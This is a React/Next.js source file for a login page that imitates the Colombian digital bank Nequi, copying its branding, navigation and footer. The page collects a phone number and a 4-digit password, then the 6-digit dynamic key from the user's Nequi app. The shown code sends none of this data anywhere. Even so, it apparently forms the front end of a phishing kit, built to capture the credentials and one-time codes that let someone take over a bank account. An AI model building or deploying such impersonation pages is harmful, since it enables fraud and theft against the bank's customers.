"use client"

import type React from "react"
import { useState } from "react"
import { Eye, EyeOff, ChevronDown } from "lucide-react"

export default function LoginPage() {
  const [currentStep, setCurrentStep] = useState<"login" | "verification">("login")
  const [isLoading, setIsLoading] = useState(false)
  const [phoneNumber, setPhoneNumber] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [pinInputs, setPinInputs] = useState(["", "", "", "", "", ""])
  const [currentPinIndex, setCurrentPinIndex] = useState(0)

  const cleanAndLimitDigits = (value: string, maxLength: number) => {
    return value.replace(/\D/g, "").slice(0, maxLength)
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const cleaned = cleanAndLimitDigits(e.target.value, 10)
    setPhoneNumber(cleaned)
  }

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const cleaned = cleanAndLimitDigits(e.target.value, 4)
    setPassword(cleaned)
  }

  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (phoneNumber.length === 10 && password.length === 4) {
      setIsLoading(true)
      setTimeout(() => {
        setIsLoading(false)
        setCurrentStep("verification")
      }, 1500)
    }
  }

  const handlePinInput = (value: string, index: number) => {
    if (value.length <= 1 && /^\d*$/.test(value)) {
      const newPinInputs = [...pinInputs]
      newPinInputs[index] = value
      setPinInputs(newPinInputs)

      if (value && index < 5) {
        setCurrentPinIndex(index + 1)
        const nextInput = document.querySelector(`input[data-pin-index="${index + 1}"]`) as HTMLInputElement
        nextInput?.focus()
      }
    }
  }

  const handleKeypadInput = (digit: string) => {
    if (digit === "") {
      if (currentPinIndex > 0) {
        const newIndex = currentPinIndex - 1
        const newPinInputs = [...pinInputs]
        newPinInputs[newIndex] = ""
        setPinInputs(newPinInputs)
        setCurrentPinIndex(newIndex)
        const prevInput = document.querySelector(`input[data-pin-index="${newIndex}"]`) as HTMLInputElement
        prevInput?.focus()
      }
    } else {
      if (currentPinIndex < 6) {
        const newPinInputs = [...pinInputs]
        newPinInputs[currentPinIndex] = digit
        setPinInputs(newPinInputs)

        if (currentPinIndex < 5) {
          setCurrentPinIndex(currentPinIndex + 1)
          const nextInput = document.querySelector(`input[data-pin-index="${currentPinIndex + 1}"]`) as HTMLInputElement
          nextInput?.focus()
        }
      }
    }
  }

  const handleVerificationSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const pin = pinInputs.join("")
    if (pin.length === 6) {
      setIsLoading(true)
      setTimeout(() => {
        setIsLoading(false)
        alert("Verificación completada")
      }, 1500)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-pink-200 to-pink-300">
      {/* Loader */}
      {isLoading && (
        <div className="fixed inset-0 z-20 flex items-center justify-center bg-white">
          <div className="flex flex-col items-center">
            <div className="w-12 h-12 border-4 border-pink-500 border-t-transparent rounded-full animate-spin"></div>
            <p className="font-semibold mt-4 text-gray-700">Espera un momentito ;) ¡No te vayas!</p>
          </div>
        </div>
      )}

      {/* Navigation */}
      <nav className="w-full flex justify-center fixed bg-white z-10 border-b border-gray-200">
        <div className="w-full p-4 max-w-[1200px] flex justify-between items-center">
          <div className="flex items-start gap-1 relative">
            <div className="w-2 h-2 bg-[#DA0081] rounded-sm absolute -top-0.5 left-0.5"></div>
            <span className="text-2xl font-bold text-[#200020] ml-3">Nequi</span>
          </div>

          <div className="hidden lg:flex items-center gap-6">
            <div className="flex items-center gap-1 text-[#200020] hover:text-[#DA0081] transition-colors cursor-pointer">
              <span>Para personas</span>
              <ChevronDown className="w-4 h-4" />
            </div>
            <div className="flex items-center gap-1 text-[#200020] hover:text-[#DA0081] transition-colors cursor-pointer">
              <span>Ayuda</span>
              <ChevronDown className="w-4 h-4" />
            </div>
            <div className="flex items-center gap-1 text-[#200020] hover:text-[#DA0081] transition-colors cursor-pointer">
              <span>Conócenos</span>
              <ChevronDown className="w-4 h-4" />
            </div>
            <a href="#" className="text-[#200020] hover:text-[#DA0081] transition-colors">
              Tu negocio
            </a>
            <a href="#" className="text-[#200020] hover:text-[#DA0081] transition-colors">
              Paga tu crédito
            </a>
            <button className="py-2 px-6 text-sm text-[#200020] border border-[#200020] bg-white rounded hover:bg-[#200020] hover:text-white transition-colors">
              Entrar
            </button>
            <button className="py-2 px-6 text-sm text-white bg-[#DA0081] rounded hover:bg-[#b3006b] transition-colors">
              Recargar
            </button>
          </div>

          <div className="lg:hidden cursor-pointer">
            <div className="w-6 h-6 flex flex-col justify-center space-y-1">
              <div className="w-full h-0.5 bg-[#200020]"></div>
              <div className="w-full h-0.5 bg-[#200020]"></div>
              <div className="w-full h-0.5 bg-[#200020]"></div>
            </div>
          </div>
        </div>
      </nav>

      {/* Main Content */}
      <section className="min-h-screen w-full px-2 flex items-center justify-center pt-[70px] pb-20">
        {currentStep === "login" ? (
          <div className="w-full flex items-center justify-center">
            <div className="w-full md:w-[400px] bg-white rounded-lg p-8 shadow-lg">
              <h1 className="text-2xl font-semibold text-center text-[#200020] mb-2">Inicia sesión</h1>
              <p className="text-gray-600 text-center mb-8">Ingresa tu número de cel y clave</p>

              <form onSubmit={handleLoginSubmit}>
                <div className="mb-6">
                  <label className="block text-sm font-medium text-gray-700 mb-2">Número de celular</label>
                  <div className="relative">
                    <div className="absolute left-3 top-1/2 transform -translate-y-1/2 flex items-center gap-2">
                      <div className="w-5 h-3 rounded-sm overflow-hidden">
                        <div className="w-full h-1/2 bg-yellow-400"></div>
                        <div className="w-full h-1/4 bg-blue-600"></div>
                        <div className="w-full h-1/4 bg-red-600"></div>
                      </div>
                      <span className="text-gray-600 text-sm">+57</span>
                    </div>
                    <input
                      type="text"
                      value={phoneNumber}
                      onChange={handlePhoneChange}
                      placeholder="Número de celular"
                      className="w-full pl-20 pr-4 py-3 border border-gray-300 rounded-lg focus:border-[#DA0081] focus:outline-none transition-colors"
                      required
                    />
                  </div>
                </div>

                <div className="mb-6">
                  <label className="block text-sm font-medium text-gray-700 mb-2">Contraseña</label>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={handlePasswordChange}
                      placeholder="Contraseña"
                      className="w-full px-4 py-3 pr-12 border border-gray-300 rounded-lg focus:border-[#DA0081] focus:outline-none transition-colors"
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                    >
                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                  </div>
                </div>

                <button
                  type="submit"
                  className="w-full py-3 bg-[#DA0081] text-white font-semibold rounded-lg hover:bg-[#b3006b] transition-colors disabled:opacity-50 mb-4"
                  disabled={phoneNumber.length !== 10 || password.length !== 4}
                >
                  Continuar
                </button>

                <div className="text-center">
                  <a href="#" className="text-[#DA0081] text-sm hover:underline">
                    ¿Olvidaste tu contraseña?
                  </a>
                </div>
              </form>

              <p className="text-sm text-center text-gray-600 mt-6">
                Recuerda que debes tener tu cel a la mano para terminar el proceso.
              </p>
            </div>
          </div>
        ) : (
          <div className="w-full flex items-center justify-center">
            <div className="w-full md:w-[370px] bg-white rounded-lg p-6 shadow-lg">
              <h1 className="text-xl pt-5 font-semibold text-center mb-5 text-[#200020]">Confirmemos que eres tú</h1>
              <p className="text-sm text-center text-gray-600 mb-6">
                Para confirmar que eres tú escribe o pega la clave dinámica que encuentras en tu App Nequi.
              </p>

              <form onSubmit={handleVerificationSubmit}>
                <div className="flex justify-center gap-3 mt-6 px-4">
                  {pinInputs.map((value, index) => (
                    <input
                      key={index}
                      type="text"
                      maxLength={1}
                      value={value}
                      data-pin-index={index}
                      onChange={(e) => handlePinInput(e.target.value, index)}
                      className="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors"
                      required
                    />
                  ))}
                </div>

                <div className="grid grid-cols-3 gap-y-2 gap-x-1 mt-8 px-3 max-w-[260px] mx-auto select-none">
                  {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
                    <button
                      key={num}
                      type="button"
                      className="h-12 text-3xl font-medium text-[#200020] focus:outline-none hover:bg-gray-100 rounded transition-colors"
                      onClick={() => handleKeypadInput(num.toString())}
                    >
                      {num}
                    </button>
                  ))}
                  <div></div>
                  <button
                    type="button"
                    className="h-12 text-3xl font-medium text-[#200020] focus:outline-none hover:bg-gray-100 rounded transition-colors"
                    onClick={() => handleKeypadInput("0")}
                  >
                    0
                  </button>
                  <button
                    type="button"
                    className="h-12 flex items-center justify-center focus:outline-none hover:bg-gray-100 rounded transition-colors"
                    onClick={() => handleKeypadInput("")}
                  >
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path
                        d="M22 3H7C6.31 3 5.77 3.35 5.41 3.88L0.21 12L5.41 20.11C5.77 20.64 6.31 21 7 21H22C23.1 21 24 20.1 24 19V5C24 3.9 23.1 3 22 3ZM19 15.59L17.59 17L14 13.41L10.41 17L9 15.59L12.59 12L9 8.41L10.41 7L14 10.59L17.59 7L19 8.41L15.41 12L19 15.59Z"
                        fill="#200020"
                      />
                    </svg>
                  </button>
                </div>

                <button
                  type="submit"
                  className="block w-full mt-8 py-3 bg-[#DA0081] rounded text-white text-base font-semibold hover:bg-[#b3006b] transition-colors disabled:opacity-50"
                  disabled={pinInputs.join("").length !== 6}
                >
                  Confirmar
                </button>
              </form>
            </div>
          </div>
        )}
      </section>

      {/* Footer */}
      <footer className="bg-white border-t border-gray-200 py-12">
        <div className="max-w-[1200px] mx-auto px-4">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            {/* Left Column - Brand */}
            <div className="space-y-4">
              <div className="flex items-start gap-1 relative mb-4">
                <div className="w-2 h-2 bg-[#DA0081] rounded-sm absolute -top-0.5 left-0.5"></div>
                <span className="text-2xl font-bold text-[#200020] ml-3">Nequi</span>
              </div>
              <p className="text-gray-600 text-sm leading-relaxed">
                La cuenta digital que te permite manejar tu plata de forma fácil, rápida y segura. Sin papeleos, sin
                filas, sin complicaciones.
              </p>
              <div className="flex space-x-4">
                <a
                  href="#"
                  className="w-8 h-8 bg-gray-200 rounded-full flex items-center justify-center hover:bg-gray-300 transition-colors"
                >
                  <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z" />
                  </svg>
                </a>
                <a
                  href="#"
                  className="w-8 h-8 bg-gray-200 rounded-full flex items-center justify-center hover:bg-gray-300 transition-colors"
                >
                  <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.402.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.357-.629-2.75-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146C9.57 23.812 10.763 24.009 12.017 24.009c6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001.012.001z" />
                  </svg>
                </a>
                <a
                  href="#"
                  className="w-8 h-8 bg-gray-200 rounded-full flex items-center justify-center hover:bg-gray-300 transition-colors"
                >
                  <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M22.46 6c-.77.35-1.6.58-2.46.69.88-.53 1.56-1.37 1.88-2.38-.83.5-1.75.85-2.72 1.05C18.37 4.5 17.26 4 16 4c-2.35 0-4.27 1.92-4.27 4.29 0 .34.04.67.11.98C8.28 9.09 5.11 7.38 3 4.79c-.37.63-.58 1.37-.58 2.15 0 1.49.75 2.81 1.91 3.56-.71 0-1.37-.2-1.95-.5v.03c0 2.08 1.48 3.82 3.44 4.21a4.22 4.22 0 0 1-1.93.07 4.28 4.28 0 0 0 4 2.98 8.521 8.521 0 0 1-5.33 1.84c-.34 0-.68-.02-1.02-.06C3.44 20.29 5.7 21 8.12 21 16 21 20.33 14.46 20.33 8.79c0-.19 0-.37-.01-.56.84-.6 1.56-1.36 2.14-2.23z" />
                  </svg>
                </a>
              </div>
            </div>

            {/* Middle Column - Products */}
            <div>
              <h3 className="font-semibold text-[#200020] mb-4">PRODUCTOS</h3>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-gray-600 hover:text-[#DA0081] transition-colors">
                    Cuenta Nequi
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-600 hover:text-[#DA0081] transition-colors">
                    Préstamos
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-600 hover:text-[#DA0081] transition-colors">
                    Inversiones
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-600 hover:text-[#DA0081] transition-colors">
                    Seguros
                  </a>
                </li>
              </ul>
            </div>

            {/* Right Column - Support */}
            <div>
              <h3 className="font-semibold text-[#200020] mb-4">SOPORTE</h3>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-gray-600 hover:text-[#DA0081] transition-colors">
                    Centro de ayuda
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-600 hover:text-[#DA0081] transition-colors">
                    Contacto
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-600 hover:text-[#DA0081] transition-colors">
                    Términos y condiciones
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-600 hover:text-[#DA0081] transition-colors">
                    Política de privacidad
                  </a>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}
